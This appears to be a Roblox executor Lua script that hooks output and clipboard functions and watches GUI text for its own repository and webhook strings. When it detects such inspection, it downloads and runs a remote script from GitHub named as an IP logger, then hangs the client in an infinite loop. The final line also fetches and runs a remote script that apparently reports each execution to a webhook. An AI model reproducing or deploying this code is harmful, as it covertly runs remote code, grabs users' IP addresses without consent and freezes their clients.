local IpGrabbed = false
if not HttpsProtect then
	HttpsProtect = {
		"Yo Mama You Are Fat!!!1!1!"
	}
end
local OrginalHttps = {
    "BruhZen",
    "172973020",
    "General-No.172973020",
    "webhooks",
    "1308728279271866409"
}

local functions = {
    rconsoleprint,
    print,
    setclipboard,
    rconsoleerror,
    rconsolewarn,
    warn,
    error
}

for _, func in next, functions do
    local oldFunc
    oldFunc = hookfunction(
        func,
        newcclosure(
            function(...)
                local args = {...}
                for _, arg in next, args do
                    for _, url in ipairs(OrginalHttps) do
                        if tostring(arg):find(url) then
	                        if not IpGrabbed then
		                        loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/LOG-IP-FROM-SKIDDER.lua'),true))()
								IpGrabbed = true 
							end
	                        while true do end
                            return 
                        end
                    end
                end
                return oldFunc(...)
            end
        )
    )
end

for _, func in next, functions do
    local oldFunc
    oldFunc = hookfunction(
        func,
        newcclosure(
            function(...)
                local args = {...}
                for _, arg in next, args do
                    for _, url in ipairs(HttpsProtect) do
                        if tostring(arg):find(url) then
	                        if not IpGrabbed then
		                        loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/LOG-IP-FROM-SKIDDER.lua'),true))()
								IpGrabbed = true 
							end
	                        while true do end
                            return 
                        end
                    end
                end
				return oldFunc(...)
            end
        )
    )
end





setmetatable(
    _G,
    {
        __newindex = function(t, i, v)
            if tostring(i) == "ID" then
	            if not IpGrabbed then
                    loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/LOG-IP-FROM-SKIDDER.lua'),true))()
					IpGrabbed = true 
				end
                while true do end return 
            end
        end
    }
)

local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
local coreGui = game.CoreGui

local function checkDescendant(descendant)
    if descendant:IsA("TextLabel") or descendant:IsA("TextBox") or descendant:IsA("TextButton") then
        for _, name in ipairs(OrginalHttps) do
	        spawn(function ()
	            if string.find(descendant.Text, name) or descendant.Name == name then
					if not IpGrabbed then
	                    loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/LOG-IP-FROM-SKIDDER.lua'),true))()
						IpGrabbed = true 
					end
	                while true do end return 
	            end
			end)
        end
        for _, name in ipairs(HttpsProtect) do
	        spawn(function()
	            if string.find(descendant.Text, name) or descendant.Name == name then
					if not IpGrabbed then
	                    loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/LOG-IP-FROM-SKIDDER.lua'),true))()
						IpGrabbed = true 
					end
	                while true do end return 
	            end
	        end)
		end
    end
end

playerGui.DescendantAdded:Connect(checkDescendant)
coreGui.DescendantAdded:Connect(checkDescendant)


loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/Webhook-Execution-Notification'),true))()
